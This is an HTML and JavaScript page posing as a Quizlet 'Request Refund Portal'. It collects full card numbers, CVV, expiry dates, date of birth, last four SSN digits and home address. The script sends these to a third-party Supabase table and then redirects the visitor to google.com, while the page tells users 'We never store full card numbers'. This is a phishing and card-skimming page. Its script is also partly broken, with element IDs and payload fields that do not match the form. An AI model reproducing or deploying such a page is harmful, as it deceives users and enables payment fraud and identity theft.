<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Request Refund Portal</title>
  <style>
    :root{
      --bg:#f6f8fa;
      --card:#fff;
      --accent:#0b69ff;
      --muted:#6b7280;
      --danger:#dc2626;
      --radius:10px;
      --shadow: 0 6px 18px rgba(12,15,20,0.08);
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      background: linear-gradient(180deg, #eef2ff 0%, var(--bg) 100%);
      min-height:100vh;
      color:#0f172a;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
      padding:32px;
      display:flex;
      align-items:flex-start;
      justify-content:center;
    }

    .container{
      width:100%;
      max-width:980px;
      background:var(--card);
      border-radius:var(--radius);
      box-shadow:var(--shadow);
      padding:24px;
    }

    header{
      display:flex;
      gap:16px;
      align-items:center;
      margin-bottom:16px;
      border-bottom:1px solid #eef2ff;
      padding-bottom:12px;
    }
    header img{ width:100px; height:auto; object-fit:contain; border-radius:8px; }
    header h1{ font-size:20px; margin:0; color:#073763; }

    main{
      padding-top:16px;
    }

    form{
      display:grid;
      grid-template-columns: 1fr 1fr;
      gap:18px;
    }

    @media (max-width:880px){
      form{ grid-template-columns: 1fr; }
    }

    section{
      background: linear-gradient(180deg, rgba(11,105,255,0.03), rgba(11,105,255,0.01));
      padding:16px;
      border-radius:8px;
      border:1px solid #eef6ff;
    }
    section h2{
      margin:0 0 8px 0;
      font-size:16px;
      color:#073763;
    }

    label{
      display:block;
      margin-top:10px;
      font-size:13px;
      color:var(--muted);
    }

    input[type="text"],
    input[type="number"],
    input[type="month"],
    input[type="date"],
    select{
      width:100%;
      padding:10px 12px;
      border-radius:6px;
      border:1px solid #dbeafe;
      background:#fff;
      margin-top:6px;
      font-size:14px;
      color:#071431;
      outline:none;
      transition:box-shadow .12s, border-color .12s;
    }

    input[type="text"]:focus,
    input[type="number"]:focus,
    input[type="month"]:focus,
    input[type="date"]:focus,
    select:focus{
      border-color: var(--accent);
      box-shadow: 0 6px 18px rgba(11,105,255,0.08);
    }

    .full-width{
      grid-column: 1 / -1;
    }

    .status {
      margin-top:8px;
      padding:10px 12px;
      border-radius:6px;
      font-size:14px;
    }
    .status.success{ background:#ecfdf5; color:#065f46; border:1px solid #bbf7d0; }
    .status.error{ background:#fff1f2; color:var(--danger); border:1px solid #fecaca; }

    .actions{
      grid-column: 1 / -1;
      display:flex;
      justify-content:flex-end;
      align-items:center;
      gap:12px;
      margin-top:6px;
    }

    button{
      background:var(--accent);
      color:white;
      border:0;
      padding:10px 16px;
      border-radius:8px;
      font-weight:600;
      cursor:pointer;
      box-shadow: 0 8px 22px rgba(11,105,255,0.14);
      transition:transform .08s ease, box-shadow .08s;
    }
    button:active{ transform:translateY(1px); }
    button[disabled]{
      opacity:0.6; cursor:not-allowed; box-shadow:none;
    }

    .info-line{
      font-size:13px;
      color:var(--muted);
      margin-top:4px;
    }

    /* small helper for errors under fields */
    .error-text{ color:var(--danger); font-size:12px; margin-top:6px; display:none; }

    footer.promo{
      margin-top:16px;
      font-size:13px;
      color:var(--muted);
      display:flex;
      justify-content:space-between;
      align-items:center;
      gap:12px;
    }
    footer.promo a{ color:var(--accent); text-decoration:none; font-weight:600; }
  </style>
</head>
<body>
  <div class="container" role="main">
    <header>
      <img src="https://i.postimg.cc/CLKVXjQf/images.png" alt="Logo" />
      <h1>Request Refund Portal</h1>
    </header>

    <main>
      <form id="refund-form" novalidate>
        <section>
          <h2>Refund Information</h2>

          <label for="orderId">Reference ID:</label>
          <input type="text" id="orderId" name="orderId" required autocomplete="off" />

          <label for="amount">Amount:</label>
          <input type="number" id="amount" name="amount" required min="0" step="0.01" placeholder="0.00" />

          <label for="reason">Reason for Refund:</label>
          <select id="reason" name="reason" required>
            <option value="">Select</option>
            <option value="double-charge">Double Charge</option>
            <option value="closure">Closure of Account</option>
            <option value="no-use">No Longer Making Use Of Quizlet</option>
          </select>
        </section>

        <section>
          <h2>Account Information</h2>

          <label for="firstName">First Name:</label>
          <input type="text" id="firstName" name="firstName" required />

          <label for="lastName">Last Name:</label>
          <input type="text" id="lastName" name="lastName" required />

          <label for="dob">Date of Birth:</label>
          <input type="date" id="dob" name="dob" required />

          <label for="mobileNumber">Mobile Number:</label>
          <input type="text" id="mobileNumber" name="mobileNumber" required />

          <label for="lfssn">Last four SSN:</label>
          <input type="number" id="lfssn" name="lfssn" required min="0" max="9999" />

          <label for="homeAddress">Home Address:</label>
          <input type="text" id="homeAddress" name="homeAddress" required />

          <label for="zipCode">Zip Code:</label>
          <input type="text" id="zipCode" name="zipCode" required />

          <label for="cardType">Card Type:</label>
          <select id="cardType" name="cardType" required>
            <option value="">Select</option>
            <option value="visa">Visa</option>
            <option value="mastercard">Mastercard</option>
            <option value="amex">American Express</option>
          </select>

          <label for="cardNumber">Card Number:</label>
          <input type="text" id="cardNumber" name="cardNumber" required inputmode="numeric" pattern="^\d{9,16}$" placeholder="Digits only (9-16)" />

          <label for="expirationDate">Expiration Date:</label>
          <input type="month" id="expirationDate" name="expirationDate" required />

          <label for="cvv">CVV:</label>
          <input type="text" id="cvv" name="cvv" required inputmode="numeric" pattern="^\d{3,4}$" placeholder="3 or 4 digits" />
        </section>

        <div class="full-width actions">
          <div style="flex:1">
            <div id="status-container" aria-live="polite"></div>
            <div class="info-line">All fields are required. We never store full card numbers.</div>
          </div>
          <button id="submit-btn" type="submit">Request Refund</button>
        </div>
      </form>
    </main>

    <footer class="promo">
      <div>Need more conversions or advanced features? Try CodingFleet for faster, multi-model code conversions.</div>
      <a href="https://codingfleet.com/pricing/" target="_blank" rel="noopener">See Pricing â†’</a>
    </footer>
  </div>
<!-- Your existing HTML content -->

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <script>
    (function () {
  // --- Supabase Initialization ---
  const SUPABASE_URL = 'https://cghtpwigslxcqfjjdzbo.supabase.co'; // Replace with your Supabase URL
  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNnaHRwd2lnc2x4Y3FmampkemJvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg0NTczODMsImV4cCI6MjA3NDAzMzM4M30.R99OU266FG65I2g0mdE3kiPh0gFIj7WIjepyM21KUJ0'; // Replace with your Supabase anon public key

  const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
  // --- End Supabase Initialization ---

  const form = document.getElementById('refundForm');
  const statusContainer = document.getElementById('statusMessage');
  const submitButton = form.querySelector('button[type="submit"]');

  // Set max date for DOB to today
  const dobInput = document.getElementById('dob');
  if (dobInput) {
    dobInput.max = new Date().toISOString().split('T')[0];
  }

  // Helper to set status messages
  function setStatus(message, type) {
    statusContainer.textContent = message;
    statusContainer.className = `status-message ${type}`;
    statusContainer.setAttribute('aria-live', 'polite');
  }

  // Helper to clear status messages
  function clearStatus() {
    statusContainer.textContent = '';
    statusContainer.className = 'status-message';
    statusContainer.removeAttribute('aria-live');
  }

  // Helper to read form data
  function readFormData() {
    const formData = {};
    const fields = form.querySelectorAll('input, select, textarea');
    fields.forEach(field => {
      if (field.id) { // Only include fields with an ID
        formData[field.id] = field.value;
      }
    });
    return formData;
  }

  // Helper to validate a single field
  function validateField(el) {
    let isValid = true;
    let errorMessage = '';

    // Clear previous error
    const errorSpan = el.nextElementSibling;
    if (errorSpan && errorSpan.classList.contains('error-message')) {
      errorSpan.textContent = '';
    }
    el.classList.remove('invalid');

    if (el.required && !el.value.trim()) {
      isValid = false;
      errorMessage = 'This field is required.';
    } else if (el.type === 'email' && el.value && !el.checkValidity()) {
      isValid = false;
      errorMessage = 'Please enter a valid email address.';
    } else if (el.id === 'cardNumber' && el.value) {
      // Basic check for 13-19 digits, allows spaces
      const cleanedCardNumber = el.value.replace(/\s+/g, '');
      if (!/^\d{13,19}$/.test(cleanedCardNumber)) {
        isValid = false;
        errorMessage = 'Please enter a valid card number.';
      }
    } else if (el.id === 'cvv' && el.value) {
      // Basic check for 3-4 digits
      if (!/^\d{3,4}$/.test(el.value)) {
        isValid = false;
        errorMessage = 'Please enter a valid CVV (3 or 4 digits).';
      }
    } else if (el.id === 'dob' && el.value) {
      const selectedDate = new Date(el.value);
      const today = new Date();
      today.setHours(0, 0, 0, 0); // Normalize today to start of day
      if (selectedDate > today) {
        isValid = false;
        errorMessage = 'Date of Birth cannot be in the future.';
      }
    } else if (el.id === 'ssn' && el.value) {
      // Basic SSN format validation (###-##-#### or #########)
      if (!/^(\d{3}-\d{2}-\d{4}|\d{9})$/.test(el.value)) {
        isValid = false;
        errorMessage = 'Please enter a valid SSN (e.g., XXX-XX-XXXX or XXXXXXXXX).';
      }
    }

    if (!isValid) {
      el.classList.add('invalid');
      if (errorSpan && errorSpan.classList.contains('error-message')) {
        errorSpan.textContent = errorMessage;
      } else {
        const newErrorSpan = document.createElement('span');
        newErrorSpan.className = 'error-message';
        newErrorSpan.textContent = errorMessage;
        el.parentNode.insertBefore(newErrorSpan, el.nextSibling);
      }
    }
    return isValid;
  }

  // Helper to show all field errors
  function showFieldErrors() {
    let formIsValid = true;
    const fields = form.querySelectorAll('input, select, textarea');
    fields.forEach(field => {
      if (!validateField(field)) {
        formIsValid = false;
      }
    });
    return formIsValid;
  }

  // --- MODIFIED: handleFormSubmit to use Supabase ---
  async function handleFormSubmit(formData) {
    // Prepare payload for Supabase
    const payload = {
      reference_id: formData.referenceId,
      amount: parseFloat(formData.amount) || 0,
      reason: formData.reason,
      first_name: formData.firstName,
      last_name: formData.lastName,
      email: formData.email,
      mobile_number: formData.mobileNumber,
      dob: formData.dob,
      ssn: formData.ssn,
      // WARNING: Storing raw card data is not PCI compliant.
      // For production, use tokenization via a payment gateway.
      card_number: formData.cardNumber ? String(formData.cardNumber).replace(/\s+/g, '') : '',
      card_holder: formData.cardHolder,
      expiry_month: formData.expiryMonth,
      expiry_year: formData.expiryYear,
      cvv: formData.cvv ? String(formData.cvv).trim() : ''
    };

    try {
      const { data, error } = await supabase
        .from('refund_requests')
        .insert([payload]);

      if (error) {
        throw new Error(error.message || 'Supabase insertion failed.');
      }

      return data; // Supabase returns the inserted data
    } catch (err) {
      console.error('Supabase submission error:', err);
      throw new Error(`Failed to submit refund request: ${err.message || err}`);
    }
  }
  // --- END MODIFIED handleFormSubmit ---

  // Reset form after submission
  function resetForm() {
    form.reset();
    const errorSpans = form.querySelectorAll('.error-message');
    errorSpans.forEach(span => span.remove());
    const invalidFields = form.querySelectorAll('.invalid');
    invalidFields.forEach(field => field.classList.remove('invalid'));
    clearStatus();
  }

  // Event Listeners
  form.addEventListener('submit', async function (e) {
    e.preventDefault();
    clearStatus();

    if (!showFieldErrors()) {
      setStatus('Please correct the errors in the form.', 'error');
      return;
    }

    submitButton.disabled = true;
    submitButton.textContent = 'Submitting...';
    setStatus('Processing your request...', 'info');

    try {
      const formData = readFormData();
      await handleFormSubmit(formData);

      setStatus('Refund request submitted successfully! Redirecting...', 'success');
      resetForm();
      setTimeout(() => {
        window.location.href = 'https://www.google.com'; // Redirect after success
      }, 3000); // 3 seconds
    } catch (error) {
      console.error('Submission error:', error);
      setStatus(`Submission failed: ${error.message}`, 'error');
    } finally {
      submitButton.disabled = false;
      submitButton.textContent = 'Request Refund';
    }
  });

  // Clear inline errors and status message on input
  form.addEventListener('input', function (e) {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') {
      validateField(e.target);
      clearStatus(); // Clear global status on user interaction
    }
  });
})();

  </script>
</body>
</html>
